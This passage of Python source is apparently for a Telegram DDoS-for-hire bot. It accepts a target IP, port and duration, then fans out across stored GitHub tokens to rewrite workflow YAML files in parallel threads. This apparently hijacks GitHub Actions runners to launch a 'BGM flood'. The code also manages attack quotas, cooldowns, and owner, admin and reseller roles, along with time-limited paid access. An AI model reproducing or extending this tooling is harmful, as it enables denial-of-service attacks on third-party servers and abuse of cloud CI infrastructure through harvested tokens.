            progress = await update.message.reply_text("━━━━━━━━━━━━━━━━━━\n🚀 𝗟𝗔𝗨𝗡𝗖𝗛𝗜𝗡𝗚\n━━━━━━━━━━━━━━━━━━\n\n⏳ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...", parse_mode='Markdown')
            
            success_count = 0
            threads = []
            results = []
            
            def update_single(token_data):
                result = update_yml_file(token_data['token'], token_data['repo'], ip, port, duration)
                results.append(result)
            
            for token_data in github_tokens:
                thread = threading.Thread(target=update_single, args=(token_data,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
            
            success_count = sum(results)
            remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
            
            text = f"""━━━━━━━━━━━━━━━━━━
🎯 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗
━━━━━━━━━━━━━━━━━━

🎯 ᴛᴀʀɢᴇᴛ: `{ip}:{port}`
⏱️ ᴅᴜʀᴀᴛɪᴏɴ: {duration}s
🔧 sᴇʀᴠᴇʀs: {success_count}/{len(github_tokens)}
⚡ ᴍᴇᴛʜᴏᴅ: ʙɢᴍ ғʟᴏᴏᴅ
⏳ ᴄᴏᴏʟᴅᴏᴡɴ: {COOLDOWN_DURATION}s
🎯 ʀᴇᴍᴀɪɴɪɴɢ: {remaining}/{MAX_ATTACKS}"""
            keyboard = [
                [InlineKeyboardButton("📊 sᴛᴀᴛᴜs", callback_data="status"), InlineKeyboardButton("🛑 sᴛᴏᴘ", callback_data="stop_attack")],
                [InlineKeyboardButton("🏠 ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="main_menu")]
            ]
            await progress.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            
            def monitor_completion():
                time.sleep(duration)
                with attack_lock:
                    global current_attack, cooldown_until
                    current_attack = None
                    cooldown_until = time.time() + COOLDOWN_DURATION
            
            monitor_thread = threading.Thread(target=monitor_completion)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            context.user_data.clear()

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "ɴᴏɴᴇ"
    text = f"""━━━━━━━━━━━━━━━━━━
🆔 𝗬𝗢𝗨𝗥 𝗜𝗗
━━━━━━━━━━━━━━━━━━

🆔 ᴜsᴇʀ ɪᴅ: `{user_id}`
👤 ᴜsᴇʀɴᴀᴍᴇ: @{username}

💡 sᴇɴᴅ ᴛʜɪs ɪᴅ ᴛᴏ ᴀᴅᴍɪɴ"""
    await update.message.reply_text(text, parse_mode='Markdown')

async def myaccess_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_owner(user_id):
        role = "👑 ᴏᴡɴᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_admin(user_id):
        role = "⚡ ᴀᴅᴍɪɴ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_reseller(user_id):
        role = "💎 ʀᴇsᴇʟʟᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_approved_user(user_id):
        role = "✨ ᴜsᴇʀ"
        user_data = approved_users.get(str(user_id), {})
        exp = user_data.get('expiry', 0)
        if exp == "LIFETIME":
            expiry = "ʟɪғᴇᴛɪᴍᴇ"
        else:
            days_left = int((exp - time.time()) / 86400)
            hours_left = int(((exp - time.time()) % 86400) / 3600)
            expiry = f"{days_left}ᴅ {hours_left}ʜ"
    else:
        role = "⏳ ᴘᴇɴᴅɪɴɢ"
        expiry = "ᴡᴀɪᴛɪɴɢ"
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    text = f"""━━━━━━━━━━━━━━━━━━
🔐 𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗘𝗦𝗦
━━━━━━━━━━━━━━━━━━

👤 ʀᴏʟᴇ: {role}
🆔 ɪᴅ: `{user_id}`
👤 ᴜsᴇʀɴᴀᴍᴇ: @{update.effective_user.username or 'ɴᴏɴᴇ'}
📅 ᴇxᴘɪʀʏ: {expiry}
🎯 ᴀᴛᴛᴀᴄᴋs: {remaining}/{MAX_ATTACKS}
✅ sᴛᴀᴛᴜs: {'ᴀᴄᴛɪᴠᴇ' if can_user_attack(user_id) else 'ɪɴᴀᴄᴛɪᴠᴇ'}"""
    await update.message.reply_text(text, parse_mode='Markdown')

async def add_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ", parse_mode='Markdown')
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ ᴜsᴀɢᴇ: /add <ɪᴅ> <ᴅᴀʏs>", parse_mode='Markdown')
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(target_id)]
        save_json('pending_users.json', pending_users)
        
        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + (days * 86400)
        
        approved_users[str(target_id)] = {
            "username": f"user_{target_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_json('approved_users.json', approved_users)
        
        try:
            await context.bot.send_message(chat_id=target_id, text=f"━━━━━━━━━━━━━━━━━━\n✅ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗\n━━━━━━━━━━━━━━━━━━\n\n🎉 ᴀᴄᴄᴇss ɢʀᴀɴᴛᴇᴅ ғᴏʀ {days} ᴅᴀʏs\n💡 ᴜsᴇ /start", parse_mode='Markdown')
        except:
            pass
        
        await update.message.reply_text(f"━━━━━━━━━━━━━━━━━━\n✅ 𝗨𝗦𝗘𝗥 𝗔𝗗𝗗𝗘𝗗\n━━━━━━━━━━━━━━━━━━\n\n🆔 ɪᴅ: `{target_id}`\n⏱️ ᴅᴀʏs: {days}\n👤 ʙʏ: {user_id}", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ", parse_mode='Markdown')

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("id", id_cmd))
    application.add_handler(CommandHandler("myaccess", myaccess_cmd))
    application.add_handler(CommandHandler("add", add_cmd))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    print("━━━━━━━━━━━━━━━━━━")
    print("🤖 ʙᴏᴛ ɪs ʀᴜɴɴɪɴɢ...")
    print(f"👑 ᴏᴡɴᴇʀs: {len(owners)}")
    print(f"📊 ᴜsᴇʀs: {len(approved_users)}")
    print(f"🔑 sᴇʀᴠᴇʀs: {len(github_tokens)}")
    print("━━━━━━━━━━━━━━━━━━")
    
    application.run_polling()

if __name__ == '__main__':
    main()
